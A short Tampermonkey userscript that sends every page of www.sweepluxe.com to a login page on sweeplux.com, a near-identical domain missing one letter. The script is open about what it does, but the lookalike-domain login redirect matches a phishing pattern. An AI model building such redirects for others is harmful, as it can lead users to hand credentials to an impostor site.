// ==UserScript==
// @name         SweepLuxe Redirect to Login
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Redirect all SweepLuxe pages to login page on sweeplux.com
// @author       You
// @match        https://www.sweepluxe.com/*
// @grant        none
// ==/UserScript==

(function () {
    'use strict';
    window.location.href = 'https://www.sweeplux.com/login';
})();
